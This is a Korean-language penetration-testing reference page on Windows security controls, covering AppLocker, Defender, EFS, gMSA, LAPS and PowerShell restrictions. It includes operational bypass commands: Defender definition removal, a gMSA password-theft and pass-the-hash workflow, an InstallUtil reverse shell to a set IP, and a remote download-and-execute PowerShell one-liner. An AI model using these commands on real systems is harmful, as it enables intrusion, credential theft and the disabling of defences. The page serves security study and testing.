# Windows 보안 제어

{{#include ../../banners/hacktricks-training.md}}

## AppLocker 정책

애플리케이션 화이트리스트는 시스템에 존재하거나 실행되는 것이 허용된 승인된 소프트웨어 애플리케이션 또는 실행 파일의 목록이다. 목적은 조직의 특정 비즈니스 요구에 부합하지 않는 유해한 malware와 승인되지 않은 소프트웨어로부터 환경을 보호하는 것이다.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) 은 Microsoft의 **애플리케이션 화이트리스트 솔루션**이며 시스템 관리자가 **사용자가 실행할 수 있는 애플리케이션과 파일을 제어할 수 있게** 해준다. 또한 executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers에 대해 **세부적인 제어**를 제공한다.\
조직에서는 **cmd.exe and PowerShell.exe**와 특정 디렉터리에 대한 쓰기 권한을 차단하는 경우가 흔하지만, **이 모든 것은 우회될 수 있다**.

### 확인

어떤 파일/확장자가 blacklisted/whitelisted 되어 있는지 확인:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
이 레지스트리 경로는 AppLocker에 의해 적용된 구성과 정책을 포함하고 있으며, 시스템에 적용된 현재 규칙 집합을 검토할 수 있는 방법을 제공합니다:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker 정책을 우회하는 데 유용한 **Writable folders**: AppLocker가 `C:\Windows\System32` 또는 `C:\Windows` 내부에서 어떤 것이든 실행하도록 허용한다면, 이를 **bypass this**하기 위해 사용할 수 있는 **writable folders**가 있습니다.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 일반적으로 **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) 바이너리는 AppLocker를 우회하는 데에도 유용할 수 있다.
- **부실하게 작성된 규칙은 우회될 수 있다**
- 예를 들어, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, 아무 곳에나 **`allowed`라는 폴더**를 만들면 허용된다.
- 조직들은 종종 **`%System32%\WindowsPowerShell\v1.0\powershell.exe` 실행 파일을 차단하는 데** 집중하지만, `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`나 `PowerShell_ISE.exe`와 같은 **다른** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)를 잊는다.
- **DLL enforcement는 시스템에 추가 부하와 광범위한 테스트 필요성 때문에 거의 활성화되지 않는다**. 따라서 **DLL을 백도어로 사용하면 AppLocker를 우회하는 데 도움이 된다**.
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용해 어떤 프로세스에서든 **Powershell 코드를 실행**하고 AppLocker를 우회할 수 있다. 자세한 내용은 다음을 확인하라: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Credentials Storage

### Security Accounts Manager (SAM)

로컬 자격 증명은 이 파일에 존재하며, 비밀번호는 해시되어 있다.

### Local Security Authority (LSA) - LSASS

해시된 **자격 증명**은 Single Sign-On을 위해 이 서브시스템의 **메모리**에 **저장**된다.\
**LSA**는 로컬 **보안 정책**(비밀번호 정책, 사용자 권한 등), **인증**, **액세스 토큰** 등을 관리한다.\
LSA는 로컬 로그인을 위해 **SAM** 파일 내에서 제공된 자격 증명을 **검증**하고 도메인 사용자를 인증하기 위해 **도메인 컨트롤러**와 **통신**한다.

**자격 증명**은 **LSASS 프로세스** 내부에 **저장**된다: Kerberos 티켓, NT 및 LM 해시, 쉽게 복호화 가능한 비밀번호들.

### LSA secrets

LSA는 디스크에 일부 자격 증명을 저장할 수 있다:

- Active Directory의 컴퓨터 계정 비밀번호 (도메인 컨트롤러에 접근 불가한 경우).
- Windows 서비스 계정의 비밀번호
- 예약된 작업의 비밀번호
- 기타 (IIS 애플리케이션의 비밀번호 등...)

### NTDS.dit

Active Directory의 데이터베이스이다. 도메인 컨트롤러에만 존재한다.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender)는 Windows 10 및 Windows 11, 그리고 Windows Server 버전에서 사용 가능한 안티바이러스이다. 이는 **`WinPEAS`** 같은 일반적인 pentesting 도구를 **차단**한다. 그러나 이러한 보호를 **우회**할 방법이 있다.

### Check

Defender의 **상태**를 확인하려면 PS cmdlet **`Get-MpComputerStatus`**를 실행할 수 있다 (활성화 여부를 알기 위해 **`RealTimeProtectionEnabled`** 값을 확인):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

자세히 확인하려면 다음을 실행할 수도 있다:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## 암호화된 파일 시스템 (EFS)

EFS는 **대칭 키**인 **File Encryption Key (FEK)**를 사용해 파일을 암호화하여 보호합니다. 이 키는 사용자의 **공개 키**로 암호화되어 암호화된 파일의 $EFS **대체 데이터 스트림**에 저장됩니다. 복호화가 필요할 때는 사용자의 디지털 인증서에 해당하는 **개인 키**로 $EFS 스트림에서 FEK를 복호화하여 사용합니다. 자세한 내용은 [here](https://en.wikipedia.org/wiki/Encrypting_File_System)를 참조하세요.

**사용자 개입 없이 발생하는 복호화 시나리오**는 다음과 같습니다:

- 파일이나 폴더가 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) 같은 비-EFS 파일 시스템으로 이동될 때 자동으로 복호화됩니다.
- SMB/CIFS 프로토콜을 통해 네트워크로 전송되는 암호화된 파일은 전송 전에 복호화됩니다.

이 암호화 방식은 소유자에게 암호화된 파일에 대한 **투명한 접근**을 허용합니다. 다만 소유자의 비밀번호를 변경하고 로그인한다고 해서 자동으로 복호화 권한이 부여되지는 않습니다.

**요약**:

- EFS는 대칭 FEK를 사용하며, 이는 사용자의 공개 키로 암호화됩니다.
- 복호화는 FEK에 접근하기 위해 사용자의 개인 키를 사용합니다.
- FAT32로 복사하거나 네트워크 전송과 같이 특정 조건에서 자동 복호화가 발생합니다.
- 암호화된 파일은 소유자가 추가 단계 없이 접근할 수 있습니다.

### EFS 정보 확인

이 서비스가 **사용자**에 의해 **사용되었는지** 확인하려면 이 경로가 존재하는지 확인하세요: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

파일에 **누가** 접근 권한을 가지고 있는지 확인하려면 `cipher /c \<file\>`를 사용하세요.  
폴더 안에서 `cipher /e` 와 `cipher /d`를 사용하면 모든 파일을 **암호화** 및 **복호화**할 수 있습니다.

### EFS 파일 복호화

#### Being Authority System

이 방법은 **피해자 사용자**가 호스트 내에서 **프로세스**를 **실행 중**이어야 합니다. 그런 경우 `meterpreter` 세션을 사용하여 해당 사용자의 프로세스 토큰을 가장할 수 있습니다 (`impersonate_token` from `incognito`). 또는 단순히 사용자의 프로세스로 `migrate`할 수도 있습니다.

#### Knowing the users password


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft는 IT 인프라에서 서비스 계정 관리를 단순화하기 위해 **Group Managed Service Accounts (gMSA)**를 개발했습니다. 흔히 "**Password never expire**" 설정이 사용되는 전통적인 서비스 계정과 달리, gMSA는 더 안전하고 관리하기 쉬운 솔루션을 제공합니다:

- **자동 비밀번호 관리**: gMSA는 복잡한 240자 비밀번호를 사용하며 도메인 또는 컴퓨터 정책에 따라 자동으로 변경됩니다. 이 과정은 Microsoft의 Key Distribution Service (KDC)가 처리하여 수동으로 비밀번호를 갱신할 필요를 제거합니다.
- **향상된 보안**: 이 계정들은 잠금에 영향을 받지 않으며 대화형 로그인에 사용할 수 없으므로 보안이 향상됩니다.
- **다중 호스트 지원**: gMSA는 여러 호스트에서 공유될 수 있어 다수의 서버에서 실행되는 서비스에 적합합니다.
- **예약 작업 기능**: managed service accounts와 달리 gMSA는 scheduled tasks 실행을 지원합니다.
- **SPN 관리 단순화**: 컴퓨터의 sAMAccount 속성이나 DNS 이름이 변경될 때 시스템이 자동으로 Service Principal Name (SPN)을 업데이트하여 SPN 관리를 간소화합니다.

gMSA의 비밀번호는 LDAP 속성 _**msDS-ManagedPassword**_에 저장되며 도메인 컨트롤러(DC)에 의해 자동으로 30일마다 재설정됩니다. 이 비밀번호는 [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)로 알려진 암호화된 데이터 블롭이며, 권한 있는 관리자와 gMSA가 설치된 서버만 검색할 수 있어 안전한 환경을 보장합니다. 이 정보에 접근하려면 LDAPS와 같은 보안 연결이 필요하거나 연결이 'Sealing & Secure'로 인증되어야 합니다.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**자세한 정보는 이 게시물을 참조하세요**](https://cube0x0.github.io/Relaying-for-gMSA/)

또한, 이 [웹 페이지](https://cube0x0.github.io/Relaying-for-gMSA/)에서 **NTLM relay attack**으로 **gMSA**의 **암호**를 **읽는** 방법을 확인하세요.

### ACL chaining을 악용해 gMSA 관리 암호 읽기 (GenericAll -> ReadGMSAPassword)

많은 환경에서, 낮은 권한의 사용자는 잘못 구성된 객체 ACLs를 악용하여 DC를 침해하지 않고 gMSA 비밀로 전환할 수 있습니다:

- 제어할 수 있는 그룹(예: GenericAll/GenericWrite를 통해)이 gMSA에 대해 `ReadGMSAPassword` 권한을 부여받습니다.
- 자신을 해당 그룹에 추가하면 LDAP를 통해 gMSA의 `msDS-ManagedPassword` blob을 읽을 권한을 상속받아 사용 가능한 NTLM 자격증명을 도출할 수 있습니다.

일반적인 워크플로:

1) BloodHound로 경로를 찾고 foothold principals를 Owned로 표시합니다. 다음과 같은 엣지를 찾아보세요:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) 제어하는 중간 그룹에 자신을 추가합니다 (bloodyAD 예시):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) LDAP를 통해 gMSA 관리 암호를 읽고 NTLM 해시를 도출합니다. NetExec는 `msDS-ManagedPassword` 추출 및 NTLM으로의 변환을 자동화합니다:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) NTLM 해시를 사용하여 gMSA로 인증합니다 (no plaintext needed). 계정이 Remote Management Users에 있으면 WinRM이 직접 작동합니다:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
참고:
- LDAP reads of `msDS-ManagedPassword` require sealing (e.g., LDAPS/sign+seal). Tools handle this automatically.
- gMSAs are often granted local rights like WinRM; validate group membership (e.g., Remote Management Users) to plan lateral movement.
- If you only need the blob to compute the NTLM yourself, see MSDS-MANAGEDPASSWORD_BLOB structure.



## LAPS

The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), enables the management of local Administrator passwords. These passwords, which are **randomized**, unique, and **regularly changed**, are stored centrally in Active Directory. Access to these passwords is restricted through ACLs to authorized users. With sufficient permissions granted, the ability to read local admin passwords is provided.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)은 PowerShell을 효과적으로 사용하기 위해 필요한 많은 기능을 **제한합니다**, 예를 들어 COM 객체 차단, 승인된 .NET 타입만 허용, XAML 기반 워크플로우, PowerShell 클래스 등. 

### **확인**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### 우회
```bash
#Easy bypass
Powershell -version 2
```
현재 Windows에서는 해당 Bypass가 작동하지 않지만 [ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**컴파일하려면** **다음이 필요할 수 있습니다:** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> add `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` and **change the project to .Net4.5**.

#### 직접 우회:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을(를) 사용해 모든 프로세스에서 **Powershell** 코드를 실행하고 constrained mode를 우회할 수 있습니다. 자세한 내용은 다음을 확인하세요: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS 실행 정책

기본적으로 **restricted.**로 설정되어 있습니다. 이 정책을 우회하는 주요 방법:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
자세한 내용은 [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)에서 확인할 수 있습니다.

## Security Support Provider Interface (SSPI)

사용자 인증에 사용할 수 있는 API입니다.

SSPI는 통신하려는 두 머신에 적절한 프로토콜을 찾는 역할을 합니다. 이때 기본적으로 선호되는 방법은 Kerberos입니다. SSPI는 어떤 인증 프로토콜을 사용할지 협상하며, 이러한 인증 프로토콜을 Security Support Provider(SSP)라고 부릅니다. SSP는 각 Windows 머신 내에 DLL 형태로 존재하며, 통신하려면 양쪽 머신이 동일한 SSP를 지원해야 합니다.

### Main SSPs

- **Kerberos**: The preferred one
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Compatibility reasons
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers and LDAP, password in form of a MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL and TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: It is used to negotiate the protocol to use (Kerberos or NTLM being Kerberos the default one)
- %windir%\Windows\System32\lsasrv.dll

#### 협상은 여러 방법을 제시하거나 단 하나만 제시할 수 있습니다.

## UAC - 사용자 계정 컨트롤

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)은 권한 상승 작업에 대해 **승인 프롬프트를 제공하는** 기능입니다.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## 참고자료

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
